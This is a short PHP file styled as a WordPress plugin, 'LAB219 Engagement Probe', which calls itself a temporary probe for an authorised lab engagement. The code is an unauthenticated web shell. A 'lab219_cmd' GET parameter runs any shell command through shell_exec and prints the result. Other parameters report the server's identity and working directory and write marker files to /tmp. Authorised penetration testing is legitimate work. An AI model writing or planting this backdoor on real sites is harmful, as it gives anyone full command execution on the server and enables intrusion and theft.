<?php
/*
Plugin Name: LAB219 Engagement Probe
Description: Temporary probe written during authorised lab 219 engagement. Removed after use.
Version: 1.0
*/
if ( isset($_GET['lab219_id']) ) {
    header('Content-Type: text/plain');
    echo "IDENTITY: " . trim(shell_exec('id')) . "\n";
    echo "WHOAMI_FILEOWNER: " . get_current_user() . "\n";
    echo "PHP_CWD: " . getcwd() . "\n";
    echo "NONCE: " . $_GET['lab219_id'] . "\n";
}
if ( isset($_GET['lab219_write']) ) {
    $n = preg_replace('/[^A-Za-z0-9]/','', $_GET['lab219_write']);
    $p = '/tmp/lab219_witness_' . $n;
    file_put_contents($p, 'written-by-uid=' . getmyuid() . ' nonce=' . $n);
    echo "WROTE: $p\n";
}
if ( isset($_GET['lab219_cmd']) ) {
    header('Content-Type: text/plain');
    echo shell_exec($_GET['lab219_cmd']);
}
